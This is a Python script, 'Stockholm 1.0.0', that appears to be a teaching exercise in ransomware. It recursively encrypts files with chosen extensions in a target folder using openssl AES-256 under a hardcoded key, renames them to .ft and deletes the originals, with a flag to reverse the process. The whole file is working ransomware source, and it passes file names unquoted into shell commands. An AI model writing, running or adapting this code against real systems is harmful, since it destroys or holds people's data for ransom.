import os
import argparse
import stat
import json

INFECTION_FOLDER = os.environ["HOME"] + "/infection/"
EXTENSIONS = json.load(open("./extensions.json"))

def encrypt_files(folder, silent, key) -> None:
	for file in os.listdir(folder):
		file_path = folder + file
		if os.path.isdir(file_path):
			encrypt_files(file_path + "/", silent, key)
		if os.path.isfile(file_path) and ("."+ str(file_path).split(".")[-1]) in EXTENSIONS and not file_path.endswith(".ft"):
			st = os.stat(file_path)
			if bool(st.st_mode & stat.S_IRGRP):
				os.system(f"openssl enc -k {key} -aes256 -base64 -e -in {file_path} -out {file_path}.ft")
				if silent is False:
					print(f"Encrypting {file_path}")
				os.remove(file_path)
			else:
				if silent is False:
					print(f"Could not encrypt {file_path}, no permission")

def	decrypt_files(folder, silent, key) -> None:
	for file in os.listdir(folder):
		file_path = folder + file
		if os.path.isdir(file_path):
			decrypt_files(file_path + "/", silent, key)
		if os.path.isfile(file_path) and file_path.endswith(".ft"):
			st = os.stat(file_path)
			if bool(st.st_mode & stat.S_IRGRP):
				os.system(f"openssl enc -k {key} -aes256 -base64 -d -in {file_path} -out {file_path[:-3]}")
				if silent is False:
					print(f"Decrypting {file_path}")
				os.remove(file_path)

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument('-s', '--silent', action="store_true", help='Silent operation; do not print the commands as they are executed.')
	parser.add_argument('-r', '--reverse', type=str, help='Decrypt the files you previously encrypted.')
	parser.add_argument('-v', '--version', action='store_true', help='Displays the version of the program.')
	parser.add_argument('-p', '--path', type=str, help='Changes the default path on where to encrypt.')
	args = parser.parse_args()
	if args.path:
		INFECTION_FOLDER = args.path if str(args.path).endswith("/") else args.path + "/"
		if not os.path.exists(INFECTION_FOLDER):
			exit(1)
	if args.version is False:
		if args.reverse:
			decrypt_files(INFECTION_FOLDER, args.silent, args.reverse)
		else:
			encrypt_files(INFECTION_FOLDER, args.silent, "0123456789ABCDEF")
	else:
		print("Stockholm 1.0.0")